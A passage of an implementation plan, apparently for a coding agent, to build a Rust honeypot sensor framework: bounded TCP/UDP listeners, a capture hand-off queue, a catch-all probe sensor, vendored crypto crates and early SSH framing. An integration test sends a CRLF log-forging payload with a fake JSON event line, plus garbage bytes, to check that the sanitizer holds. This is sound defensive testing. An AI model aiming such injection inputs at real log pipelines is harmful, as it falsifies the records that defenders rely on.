use tokio::net::{TcpStream, UdpSocket};

fn test_bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(5),
        idle_timeout: Duration::from_secs(5),
        max_duration: Duration::from_secs(10),
        max_captured_bytes: 4096,
        max_concurrent: 10,
    }
}

#[tokio::test]
async fn tcp_accept_and_handler_called() {
    let (tx, mut rx) = tokio::sync::mpsc::channel::<SocketAddr>(1);
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let (bound_addr, handle) = run_tcp_listener(addr, test_bounds(), move |stream, peer| {
        let tx = tx.clone();
        async move {
            let _ = tx.send(peer).await;
            drop(stream);
        }
    }).await.unwrap();
    let _conn = TcpStream::connect(bound_addr).await.unwrap();
    let peer = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await.unwrap().unwrap();
    assert_eq!(peer.ip(), "127.0.0.1".parse::<std::net::IpAddr>().unwrap());
    handle.abort();
}

#[tokio::test]
async fn udp_receives_and_never_responds() {
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(1);
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let (bound_addr, handle) = run_udp_listener(addr, move |data, _peer| {
        let tx = tx.clone();
        async move {
            let _ = tx.send(data.to_vec()).await;
        }
    }).await.unwrap();
    let client = UdpSocket::bind("127.0.0.1:0").await.unwrap();
    client.send_to(b"probe", bound_addr).await.unwrap();
    let data = tokio::time::timeout(Duration::from_secs(2), rx.recv()).await.unwrap().unwrap();
    assert_eq!(data, b"probe");
    // Verify zero response bytes: try to receive with a short timeout.
    let mut buf = [0u8; 1024];
    let result = tokio::time::timeout(Duration::from_millis(200),
        client.recv_from(&mut buf)).await;
    assert!(result.is_err(), "UDP listener must never send a response");
    handle.abort();
}

#[tokio::test]
async fn bind_failure_non_fatal() {
    // Occupy a port, then try to bind the listener on it.
    let blocker = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let blocked_addr = blocker.local_addr().unwrap();
    // run_tcp_listener on the blocked port should return an error for that port
    // but not crash. (If the API binds multiple ports, a single failure is non-fatal.)
    let result = run_tcp_listener(blocked_addr, test_bounds(), |_s, _p| async {}).await;
    assert!(result.is_err());
    drop(blocker);
}

#[tokio::test]
async fn handler_panic_does_not_crash_accept_loop() {
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
    let call_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = call_count.clone();
    let (bound_addr, handle) = run_tcp_listener(addr, test_bounds(), move |_stream, _peer| {
        let count = count.clone();
        async move {
            count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            panic!("handler panic");
        }
    }).await.unwrap();
    // Connect twice - both should be handled despite the panic.
    let _c1 = TcpStream::connect(bound_addr).await.unwrap();
    tokio::time::sleep(Duration::from_millis(100)).await;
    let _c2 = TcpStream::connect(bound_addr).await.unwrap();
    tokio::time::sleep(Duration::from_millis(100)).await;
    assert!(call_count.load(std::sync::atomic::Ordering::Relaxed) >= 2);
    handle.abort();
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-framework --test listener_integration`
Expected: FAIL - modules not defined.

- [ ] **Step 3: Write minimal implementation**

`bounds.rs`:
```rust
use std::time::Duration;

#[derive(Debug, Clone)]
pub struct ConnectionBounds {
    pub read_timeout: Duration,
    pub idle_timeout: Duration,
    pub max_duration: Duration,
    pub max_captured_bytes: u64,
    pub max_concurrent: u32,
}
```

`config.rs`:
```rust
use std::collections::HashMap;
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use crate::bounds::ConnectionBounds;

#[derive(Debug, Clone)]
pub struct SensorConfig {
    pub bind_addrs: Vec<SocketAddr>,
    pub wan_map: HashMap<IpAddr, IpAddr>,
    pub bounds: ConnectionBounds,
    pub log_path: PathBuf,
    pub spool_dir: PathBuf,
    pub spool_max_file_size: u64,
    pub spool_global_budget: u64,
    pub capture_queue_size: usize,
}
```

`listener.rs` - key implementation guidance:
- `run_tcp_listener`: bind `TcpListener`, spawn an accept-loop task. For each accepted connection, spawn a per-connection task wrapped in `tokio::task::spawn(async move { ... })`. Catch panics using `std::panic::AssertUnwindSafe` + `FutureExt::catch_unwind` (from `futures` crate) or `tokio::task::JoinHandle` error inspection. On panic: log the error, drop the connection, continue accepting.
- Enforce `max_concurrent` with a `tokio::sync::Semaphore`. Enforce `max_duration` with `tokio::time::timeout` around the handler future. Enforce `read_timeout` by wrapping the stream's read operations (the handler is responsible for using `ConnectionGuard` - or the framework wraps the stream).
- `run_udp_listener`: bind `UdpSocket`, loop on `recv_from`. Call handler with the datagram data and peer address. **Never call `send_to`.** This is the construction guarantee.
- Return `(SocketAddr, JoinHandle)` so the caller knows the actual bound address (for ephemeral ports in tests) and can abort/await the listener.
- Graceful shutdown: accept a `CancellationToken` or listen for `tokio::signal::ctrl_c()`. On shutdown, stop accepting new connections but allow in-flight handlers to complete up to `max_duration`.

Note: add `futures` or `futures-util` as a dependency if using `catch_unwind` for panic isolation, or use `JoinHandle::is_err()` after awaiting the spawned task. Check the current `tokio` panic handling approach against its docs.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-framework --test listener_integration`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-framework
git commit -m "feat(sensor-framework): TCP/UDP listener lifecycle with panic isolation and bounds"
```

---

### Task 6: Off-response-path capture hand-off

**Files:**
- Create: `crates/sensor-framework/src/handoff.rs`
- Modify: `crates/sensor-framework/src/lib.rs` (add module + re-exports)
- Test: inline in `handoff.rs`

**Interfaces:**
- Consumes: `QuarantineSpool` (Task 4), `EventEmitter` (Task 3), `SensorEvent` from `sensor-wire`.
- Produces: `CaptureHandoff::new(spool, emitter, queue_size) -> Self`, `CaptureHandoff::submit(&self, job: CaptureJob) -> Result<(), CaptureDropped>`, `CaptureHandoff::dropped_count(&self) -> u64`, `CaptureHandoff::start_worker(&self) -> JoinHandle`. `CaptureJob` contains the body bytes and a closure/struct that builds the `SensorEvent` once the `SampleRef` is known.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-framework/src/handoff.rs
#[cfg(test)]
mod tests {
    use super::*;
    use sensor_wire::*;
    use std::time::Duration;

    fn test_event(sample: Option<SampleRef>) -> SensorEvent {
        SensorEvent {
            v: WIRE_VERSION,
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            sensor: "test".into(),
            signal_type: SIGNAL_HONEYPOT_MALWARE_UPLOAD.into(),
            protocol: PROTO_TCP.into(),
            authenticated: true,
            observed_at: chrono::Utc::now(),
            metadata: serde_json::json!({}),
            sample,
        }
    }

    #[tokio::test]
    async fn submit_and_worker_processes() {
        let dir = tempfile::tempdir().unwrap();
        let spool_dir = dir.path().join("spool");
        std::fs::create_dir(&spool_dir).unwrap();
        let log_path = dir.path().join("events.jsonl");
        let spool = crate::spool::QuarantineSpool::new(spool_dir, 4096, 1_000_000);
        let emitter = crate::emit::EventEmitter::new(log_path.clone());
        let handoff = CaptureHandoff::new(spool, emitter, 16);
        let worker = handoff.start_worker();

        let body = b"malware payload".to_vec();
        handoff.submit(CaptureJob {
            body,
            orig_name: "evil.bin".into(),
            event_builder: Box::new(|sample| test_event(Some(sample))),
        }).unwrap();

        // Give worker time to process.
        tokio::time::sleep(Duration::from_millis(200)).await;
        worker.abort();

        let content = tokio::fs::read_to_string(&log_path).await.unwrap();
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 1);
        let event: SensorEvent = serde_json::from_str(lines[0]).unwrap();
        assert!(event.sample.is_some());
        let sample = event.sample.unwrap();
        assert!(!sample.sha256.is_empty());
        assert_eq!(sample.size, b"malware payload".len() as u64);
    }

    #[tokio::test]
    async fn full_queue_drops_and_counts() {
        let dir = tempfile::tempdir().unwrap();
        let spool_dir = dir.path().join("spool");
        std::fs::create_dir(&spool_dir).unwrap();
        let spool = crate::spool::QuarantineSpool::new(spool_dir, 4096, 1_000_000);
        let emitter = crate::emit::EventEmitter::new(dir.path().join("events.jsonl"));
        // Queue size 1, no worker draining - so second submit should drop.
        let handoff = CaptureHandoff::new(spool, emitter, 1);

        let job = || CaptureJob {
            body: b"data".to_vec(),
            orig_name: String::new(),
            event_builder: Box::new(|s| test_event(Some(s))),
        };
        handoff.submit(job()).unwrap();
        let result = handoff.submit(job());
        assert!(result.is_err());
        assert_eq!(handoff.dropped_count(), 1);
    }

    #[tokio::test]
    async fn producer_never_blocks() {
        let dir = tempfile::tempdir().unwrap();
        let spool_dir = dir.path().join("spool");
        std::fs::create_dir(&spool_dir).unwrap();
        let spool = crate::spool::QuarantineSpool::new(spool_dir, 4096, 1_000_000);
        let emitter = crate::emit::EventEmitter::new(dir.path().join("events.jsonl"));
        let handoff = CaptureHandoff::new(spool, emitter, 1);
        // Fill the queue, then verify submit returns immediately (does not block).
        handoff.submit(CaptureJob {
            body: b"first".to_vec(),
            orig_name: String::new(),
            event_builder: Box::new(|s| test_event(Some(s))),
        }).unwrap();
        let start = std::time::Instant::now();
        let _ = handoff.submit(CaptureJob {
            body: b"second".to_vec(),
            orig_name: String::new(),
            event_builder: Box::new(|s| test_event(Some(s))),
        });
        assert!(start.elapsed() < Duration::from_millis(50), "submit must not block");
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-framework handoff`
Expected: FAIL - module not defined.

- [ ] **Step 3: Write minimal implementation**

`handoff.rs`:
```rust
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use sensor_wire::{SensorEvent, SampleRef};
use crate::spool::QuarantineSpool;
use crate::emit::EventEmitter;
use tokio::sync::mpsc;

pub struct CaptureJob {
    pub body: Vec<u8>,
    pub orig_name: String,
    pub event_builder: Box<dyn FnOnce(SampleRef) -> SensorEvent + Send>,
}

pub struct CaptureDropped;

pub struct CaptureHandoff {
    tx: mpsc::Sender<CaptureJob>,
    rx: std::sync::Mutex<Option<mpsc::Receiver<CaptureJob>>>,
    dropped: Arc<AtomicU64>,
    spool: Arc<QuarantineSpool>,
    emitter: Arc<EventEmitter>,
}

impl CaptureHandoff {
    pub fn new(spool: QuarantineSpool, emitter: EventEmitter, queue_size: usize) -> Self {
        let (tx, rx) = mpsc::channel(queue_size);
        Self {
            tx,
            rx: std::sync::Mutex::new(Some(rx)),
            dropped: Arc::new(AtomicU64::new(0)),
            spool: Arc::new(spool),
            emitter: Arc::new(emitter),
        }
    }

    pub fn submit(&self, job: CaptureJob) -> Result<(), CaptureDropped> {
        // try_send: never blocks the producer.
        match self.tx.try_send(job) {
            Ok(()) => Ok(()),
            Err(_) => {
                self.dropped.fetch_add(1, Ordering::Relaxed);
                Err(CaptureDropped)
            }
        }
    }

    pub fn dropped_count(&self) -> u64 {
        self.dropped.load(Ordering::Relaxed)
    }

    pub fn start_worker(&self) -> tokio::task::JoinHandle<()> {
        let mut rx = self.rx.lock().unwrap().take()
            .expect("start_worker called twice");
        let spool = self.spool.clone();
        let emitter = self.emitter.clone();
        tokio::spawn(async move {
            while let Some(job) = rx.recv().await {
                // Hash body, write to spool, build event, emit.
                match spool.store(&job.body) {
                    Ok(mut sample_ref) => {
                        sample_ref.orig_name = job.orig_name;
                        let event = (job.event_builder)(sample_ref);
                        if let Err(e) = emitter.append(&event).await {
                            tracing::error!("capture emit failed: {e}");
                        }
                    }
                    Err(e) => {
                        tracing::warn!("spool store failed: {e:?}");
                    }
                }
            }
        })
    }
}
```

Note: `QuarantineSpool` will need to be made `Send + Sync` (it already is since `AtomicU64` is sync). `EventEmitter` needs to be `Send + Sync` too (it holds only a `PathBuf`, which is fine). If the internal structure changes, wrap in `Arc` as needed.

Update `lib.rs` with `pub mod handoff;` and re-exports.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-framework handoff`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-framework
git commit -m "feat(sensor-framework): off-response-path capture hand-off with drop-on-full"
```

---

### Task 7: sensor-catchall binary + integration tests

**Files:**
- Create: `crates/sensor-catchall/Cargo.toml`, `crates/sensor-catchall/src/lib.rs`, `crates/sensor-catchall/src/main.rs`, `crates/sensor-catchall/src/handler.rs`, `crates/sensor-catchall/tests/integration.rs`
- Modify: `Cargo.toml` (add `sensor-catchall` to workspace members)

**Interfaces:**
- Consumes: `sensor-wire` (event types + constants), `sensor-framework` (sanitizer, WAN resolver, emitter, listener, bounds, hand-off).
- Produces: `sensor-catchall` binary. No library API - the catch-all is a standalone binary that emits `catchall_probe` events.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-catchall/tests/integration.rs
use std::net::SocketAddr;
use std::time::Duration;
use tokio::io::AsyncWriteExt;
use tokio::net::{TcpStream, UdpSocket};

// Helper: start the catch-all handler on ephemeral ports, return (tcp_addr, udp_addr, log_path)
// The test uses the handler module directly rather than starting the full binary,
// so it can control ports and read the log file.

#[tokio::test]
async fn tcp_probe_emits_catchall_probe_event() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let (tcp_addr, _handle) = sensor_catchall::start_test_listener(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
    ).await.unwrap();

    let mut conn = TcpStream::connect(tcp_addr).await.unwrap();
    conn.write_all(b"GET / HTTP/1.0\r\n\r\n").await.unwrap();
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;

    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let event: sensor_wire::SensorEvent = serde_json::from_str(content.lines().next().unwrap()).unwrap();
    assert_eq!(event.signal_type, sensor_wire::SIGNAL_CATCHALL_PROBE);
    assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    assert!(!event.authenticated);
    assert_eq!(event.sensor, "catchall");
    // No protocol_label for catch-all (emulates no protocol).
    assert!(event.metadata.get("protocol_label").is_none());
    _handle.abort();
}

#[tokio::test]
async fn udp_probe_emits_event_and_zero_response() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let (udp_addr, _handle) = sensor_catchall::start_test_udp_listener(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
    ).await.unwrap();

    let client = UdpSocket::bind("127.0.0.1:0").await.unwrap();
    client.send_to(b"\x00\x01probe", udp_addr).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Verify event emitted.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let event: sensor_wire::SensorEvent = serde_json::from_str(content.lines().next().unwrap()).unwrap();
    assert_eq!(event.signal_type, sensor_wire::SIGNAL_CATCHALL_PROBE);
    assert_eq!(event.protocol, sensor_wire::PROTO_UDP);
    assert!(!event.authenticated);

    // Verify zero response bytes.
    let mut buf = [0u8; 1024];
    let result = tokio::time::timeout(Duration::from_millis(200),
        client.recv_from(&mut buf)).await;
    assert!(result.is_err(), "UDP must never respond");
    _handle.abort();
}

#[tokio::test]
async fn adversarial_input_drops_connection_not_crash() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let (tcp_addr, handle) = sensor_catchall::start_test_listener(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
    ).await.unwrap();

    // Send garbage, immediately close.
    for _ in 0..5 {
        if let Ok(mut conn) = TcpStream::connect(tcp_addr).await {
            let _ = conn.write_all(&[0xff; 1024]).await;
            drop(conn);
        }
    }
    tokio::time::sleep(Duration::from_millis(100)).await;
    // Verify the listener is still accepting.
    let conn = TcpStream::connect(tcp_addr).await;
    assert!(conn.is_ok(), "accept loop must survive adversarial input");
    handle.abort();
}

#[tokio::test]
async fn log_forging_impossible_through_real_capture_path() {
    // Drive CR/LF/ANSI injection through the real sensor capture path
    // and assert on the raw log bytes - not on the sanitizer in isolation.
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let (tcp_addr, _handle) = sensor_catchall::start_test_listener(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
    ).await.unwrap();

    // Send a payload containing CRLF + a fake JSON event line.
    let injection = b"GET /\r\n{\"v\":1,\"signal_type\":\"forged\",\"source_ip\":\"1.2.3.4\"}\r\n";
    let mut conn = TcpStream::connect(tcp_addr).await.unwrap();
    conn.write_all(injection).await.unwrap();
    drop(conn);
    tokio::time::sleep(Duration::from_millis(200)).await;
    _handle.abort();

    // Read raw log bytes. Every line must be a parseable SensorEvent
    // with signal_type == catchall_probe. There must be exactly ONE line.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(lines.len(), 1, "injection must not create extra log lines, got {}", lines.len());
    let event: sensor_wire::SensorEvent = serde_json::from_str(lines[0]).unwrap();
    assert_eq!(event.signal_type, sensor_wire::SIGNAL_CATCHALL_PROBE,
        "the only event must be a real catchall_probe, not the forged line");
}

#[tokio::test]
async fn wire_record_signal_types_map_to_valid_from_signal() {
    // Cross-crate test: verify that every signal type string constant in
    // sensor-wire maps to a valid core-scoring SignalType via serde.
    // This test requires core-scoring as a dev-dependency of sensor-catchall.
    let wire_signals = [
        sensor_wire::SIGNAL_CATCHALL_PROBE,
        sensor_wire::SIGNAL_HONEYPOT_CONNECTION,
        sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT,
        sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC,
        sensor_wire::SIGNAL_HONEYPOT_MALWARE_UPLOAD,
        sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD,
    ];
    for wire_str in &wire_signals {
        let quoted = format!("\"{}\"", wire_str);
        let parsed: Result<core_scoring::SignalType, _> = serde_json::from_str(&quoted);
        assert!(parsed.is_ok(),
            "wire signal type '{}' must deserialize to a valid core_scoring::SignalType", wire_str);
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-catchall --test integration`
Expected: FAIL - crate does not exist.

- [ ] **Step 3: Write minimal implementation**

Add `"crates/sensor-catchall"` to workspace `Cargo.toml` members.

`crates/sensor-catchall/Cargo.toml`:
```toml
[package]
name = "sensor-catchall"
version = "0.1.0"
edition = "2024"

[dependencies]
sensor-wire = { path = "../sensor-wire" }
sensor-framework = { path = "../sensor-framework" }
tokio = { version = "*", features = ["rt-multi-thread", "macros", "net", "io-util", "signal"] }
serde_json = "*"
chrono = "*"
tracing = "*"
tracing-subscriber = "*"

[dev-dependencies]
tempfile = "*"
core-scoring = { path = "../core-scoring" }
```

`src/lib.rs` - expose test helpers so integration tests can import them:
```rust
pub mod handler;
// pub fn start_test_listener(...) and start_test_udp_listener(...)
// exposed here for integration tests.
```

`handler.rs` - the per-hit logic:
- TCP handler: accept connection, read up to `max_captured_bytes` from the stream (with `read_timeout`), hex-encode the captured bytes via `to_hex_bounded`, build a `SensorEvent` with `signal_type = SIGNAL_CATCHALL_PROBE`, `protocol = PROTO_TCP`, `authenticated = false`, `sensor = "catchall"`, and `metadata` containing the hex payload sample and observed length. Close the connection after capture. No response beyond the TCP handshake itself.
- UDP handler: receive datagram (already complete), hex-encode, build event with `protocol = PROTO_UDP`. Send nothing.
- Both handlers stamp `wan_ip` from `WanResolver::resolve()` on the accepted connection's local address.

`main.rs` - composition:
- Load config (TOML or CLI args) for port set, WAN map, bounds, log path, spool config.
- Validate config at startup (port set bounded, bounds range-checked, zero != unlimited).
- Create `WanResolver`, `EventEmitter`, `QuarantineSpool` (catch-all may not need the spool, since it captures no file bodies - only payload hex in metadata), `CaptureHandoff` (optional for catch-all).
- Start TCP listeners (one per port in the set) and UDP listeners.
- Wait for shutdown signal.

Expose `start_test_listener` and `start_test_udp_listener` as `#[cfg(test)]` or as public functions that the integration test can call, to start the catch-all on ephemeral ports with a specified log path. Alternatively, expose the handler as a library function and test it through the framework's listener directly.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-catchall --test integration`
Expected: PASS. Also run the full gate: `cargo test --workspace && cargo clippy --workspace -- -D warnings && cargo fmt --all -- --check`

- [ ] **Step 5: Commit**

```bash
git add Cargo.toml Cargo.lock crates/sensor-catchall
git commit -m "feat(sensor-catchall): catch-all TCP/UDP listener with catchall_probe emission"
```

---

### Task 8: Vendor crypto crates

**Files:**
- Create: `.cargo/config.toml`, `vendor/` directory (populated by `cargo vendor`)
- Modify: `crates/sensor-ssh/Cargo.toml` (add crypto dependencies - the crate scaffold is created here for vendoring to resolve them)

**Interfaces:**
- Consumes: nothing (build tooling task).
- Produces: vendored source for all workspace dependencies in `vendor/`, `.cargo/config.toml` source replacement. All subsequent `cargo build` commands use vendored sources with no network fetch.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-ssh/src/lib.rs (scaffold)
#[cfg(test)]
mod tests {
    #[test]
    fn crypto_crates_available() {
        // Verify the crypto primitives are importable.
        let _kp = x25519_dalek::EphemeralSecret::random_from_rng(rand::rngs::OsRng);
        let sk = ed25519_dalek::SigningKey::generate(&mut rand::rngs::OsRng);
        let _vk = ed25519_dalek::VerifyingKey::from(&sk);
        use chacha20poly1305::aead::Aead;
        use chacha20poly1305::KeyInit;
        let key = chacha20poly1305::ChaCha20Poly1305::generate_key(&mut rand::rngs::OsRng);
        let cipher = chacha20poly1305::ChaCha20Poly1305::new(&key);
        let nonce = chacha20poly1305::Nonce::default();
        let ct = cipher.encrypt(&nonce, b"test".as_ref()).unwrap();
        let pt = cipher.decrypt(&nonce, ct.as_ref()).unwrap();
        assert_eq!(pt, b"test");
    }

    #[test]
    fn version_marker() {
        assert_eq!(super::VERSION_MARKER, "sensor-ssh");
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh`
Expected: FAIL - crate does not exist, crypto crates not available.

- [ ] **Step 3: Scaffold crate and vendor**

Add `"crates/sensor-ssh"` to workspace `Cargo.toml` members.

`crates/sensor-ssh/Cargo.toml`:
```toml
[package]
name = "sensor-ssh"
version = "0.1.0"
edition = "2024"

[dependencies]
sensor-wire = { path = "../sensor-wire" }
sensor-framework = { path = "../sensor-framework" }
tokio = { version = "*", features = ["rt-multi-thread", "macros", "net", "io-util", "sync", "signal", "fs", "time"] }
serde = { version = "*", features = ["derive"] }
serde_json = "*"
chrono = { version = "*", features = ["serde"] }
tracing = "*"
tracing-subscriber = "*"
sha2 = "*"
rand = { version = "*", features = ["std"] }
x25519-dalek = { version = "*", features = ["static_secrets"] }
ed25519-dalek = { version = "*", features = ["rand_core"] }
chacha20poly1305 = "*"

[dev-dependencies]
tempfile = "*"
russh = "*"
russh-keys = "*"
proptest = "*"
```

Pin ALL versions after checking current latest on crates.io. **Verify each crate's API against its docs before using it** - the API shapes in this plan are from training data and may be outdated.

`crates/sensor-ssh/src/lib.rs`:
```rust
pub const VERSION_MARKER: &str = "sensor-ssh";

// Modules added incrementally by later tasks (9-14).
// Each task adds its module here as pub so integration tests can import it.
// pub mod transport;
// pub mod hostkey;
// pub mod auth;
// pub mod channel;
// pub mod shell;
// pub mod fakefs;
// pub mod transfer;
//
// pub fn start_test_server(...) for integration tests (Task 14).
```

Run `cargo vendor` from the workspace root. This creates a `vendor/` directory with all workspace dependencies. The command prints the `.cargo/config.toml` snippet to use:

```bash
cargo vendor
```

Create `.cargo/config.toml` with the output from `cargo vendor`:
```toml
[source.crates-io]
replace-with = "vendored-sources"

[source.vendored-sources]
directory = "vendor"
```

Verify:
```bash
cargo build --workspace
```

**Important:** review the `Cargo.lock` diff carefully for the new crypto crates. Verify:
- `x25519-dalek`, `ed25519-dalek`, `chacha20poly1305` are the expected crates from the RustCrypto project.
- No unexpected dependencies were pulled in.
- The `vendor/` directory contains only the expected crates.

Add `vendor/` to git. This is a large addition but is the accepted trade-off per ADR-0011 (the build is fully hermetic and no upstream crate can be yanked from under Propolis).

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh`
Expected: PASS. Also verify: `cargo build --workspace` succeeds with no network fetch.

- [ ] **Step 5: Commit**

```bash
git add Cargo.toml Cargo.lock .cargo/config.toml vendor crates/sensor-ssh
git commit -m "feat(sensor-ssh): scaffold crate and vendor all dependencies in-tree"
```

---

### Task 9: SSH packet framing + version exchange

**Files:**
- Create: `crates/sensor-ssh/src/transport/mod.rs`, `crates/sensor-ssh/tests/transport_test.rs`
- Modify: `crates/sensor-ssh/src/lib.rs` (add `pub mod transport;`)

**Interfaces:**
- Consumes: `tokio::net::TcpStream` (async read/write).
- Produces: `SshPacket` struct, `read_packet(stream) -> Result<SshPacket>`, `write_packet(stream, payload) -> Result<()>`, `version_exchange(stream) -> Result<(String, String)>`, `build_kexinit() -> Vec<u8>`, `parse_kexinit(payload) -> Result<KexInit>`. SSH message type constants.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-ssh/tests/transport_test.rs
use sensor_ssh::transport::*;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[tokio::test]
async fn packet_round_trip() {
    let (mut client, mut server) = tokio::io::duplex(4096);
    let payload = vec![SSH_MSG_IGNORE, 0, 0, 0, 4, b't', b'e', b's', b't'];
    write_packet_unencrypted(&mut server, &payload).await.unwrap();
    let received = read_packet_unencrypted(&mut client).await.unwrap();
    assert_eq!(received.payload, payload);
}

#[tokio::test]
async fn truncated_packet_returns_error() {
    let (mut client, mut server) = tokio::io::duplex(4096);
    // Write a packet length header claiming 1000 bytes, then close.
    server.write_all(&1000u32.to_be_bytes()).await.unwrap();
    drop(server);
    let result = read_packet_unencrypted(&mut client).await;
    assert!(result.is_err());
}

#[tokio::test]
async fn version_exchange_completes() {
    let (mut client, mut server) = tokio::io::duplex(4096);
    let server_task = tokio::spawn(async move {
        do_version_exchange_server(&mut server).await
    });
    // Client side: send client version, read server version.
    client.write_all(b"SSH-2.0-TestClient_1.0\r\n").await.unwrap();
    let mut buf = vec![0u8; 256];
    let n = client.read(&mut buf).await.unwrap();
    let server_version = String::from_utf8_lossy(&buf[..n]);
    assert!(server_version.starts_with("SSH-2.0-"));
    assert!(server_version.ends_with("\r\n"));
    let (client_ver, server_ver) = server_task.await.unwrap().unwrap();
    assert!(client_ver.starts_with("SSH-2.0-TestClient"));
}

#[tokio::test]
async fn kexinit_round_trip() {
    let kexinit = build_kexinit();
    assert_eq!(kexinit[0], SSH_MSG_KEXINIT);
    let parsed = parse_kexinit(&kexinit).unwrap();
    assert!(parsed.kex_algorithms.contains("curve25519-sha256"));
    assert!(parsed.server_host_key_algorithms.contains("ssh-ed25519"));
    assert!(parsed.encryption_client_to_server.contains("chacha20-poly1305@openssh.com"));
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-ssh --test transport_test`
Expected: FAIL - module not defined.

- [ ] **Step 3: Write minimal implementation**

SSH message type constants:
```rust
pub const SSH_MSG_DISCONNECT: u8 = 1;
pub const SSH_MSG_IGNORE: u8 = 2;
pub const SSH_MSG_UNIMPLEMENTED: u8 = 3;
pub const SSH_MSG_SERVICE_REQUEST: u8 = 5;
pub const SSH_MSG_SERVICE_ACCEPT: u8 = 6;
pub const SSH_MSG_KEXINIT: u8 = 20;
pub const SSH_MSG_NEWKEYS: u8 = 21;
pub const SSH_MSG_KEX_ECDH_INIT: u8 = 30;
pub const SSH_MSG_KEX_ECDH_REPLY: u8 = 31;
pub const SSH_MSG_USERAUTH_REQUEST: u8 = 50;
pub const SSH_MSG_USERAUTH_FAILURE: u8 = 51;
pub const SSH_MSG_USERAUTH_SUCCESS: u8 = 52;
pub const SSH_MSG_CHANNEL_OPEN: u8 = 90;
pub const SSH_MSG_CHANNEL_OPEN_CONFIRMATION: u8 = 91;
pub const SSH_MSG_CHANNEL_WINDOW_ADJUST: u8 = 93;
pub const SSH_MSG_CHANNEL_DATA: u8 = 94;
pub const SSH_MSG_CHANNEL_EOF: u8 = 96;
pub const SSH_MSG_CHANNEL_CLOSE: u8 = 97;
pub const SSH_MSG_CHANNEL_REQUEST: u8 = 98;
pub const SSH_MSG_CHANNEL_SUCCESS: u8 = 99;
```

Binary packet format (RFC 4253 section 6) - unencrypted:
```
uint32  packet_length     (not including self or MAC)
byte    padding_length
byte[]  payload
byte[]  random_padding    (4-255 bytes, total padded to 8-byte multiple)
```

`read_packet_unencrypted`: read 4-byte length, validate against a maximum (e.g., 35000 per RFC), read `packet_length` bytes, extract `padding_length` from first byte, extract payload from bytes `[1..packet_length - padding_length]`.

`write_packet_unencrypted`: compute padding (minimum 4, pad to 8-byte alignment), build the packet, write in a single `write_all`.

Version exchange (`do_version_exchange_server`):
- Write server version string: `SSH-2.0-<configurable_software_version>\r\n`. The default version string must NOT identify as a known implementation whose behavior the honeypot does not replicate. Use something like a generic embedded device SSH.
- Read client version string (line ending with `\r\n`, max 255 chars per RFC 4253).
- Return `(client_version, server_version)` with the `\r\n` stripped.

KEXINIT message (`build_kexinit`):
- 16 random bytes (cookie)
- Name lists: `kex_algorithms` = `"curve25519-sha256"`, `server_host_key_algorithms` = `"ssh-ed25519"`, `encryption_*` = `"chacha20-poly1305@openssh.com"`, `mac_*` = `""` (implicit with AEAD), `compression_*` = `"none"`, `languages_*` = `""`.
- `first_kex_packet_follows` = false, reserved = 0.

Each name-list is encoded as: uint32 length, then the comma-separated ASCII names.

`parse_kexinit`: reverse of `build_kexinit`. Needed to read the client's KEXINIT and select algorithms.

`KexInit` struct:
```rust
pub struct KexInit {
    pub cookie: [u8; 16],
    pub kex_algorithms: String,
    pub server_host_key_algorithms: String,
    pub encryption_client_to_server: String,
    pub encryption_server_to_client: String,
    pub mac_client_to_server: String,
    pub mac_server_to_client: String,
    pub compression_client_to_server: String,
    pub compression_server_to_client: String,
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-ssh --test transport_test`
Expected: PASS.

- [ ] **Step 5: Commit**

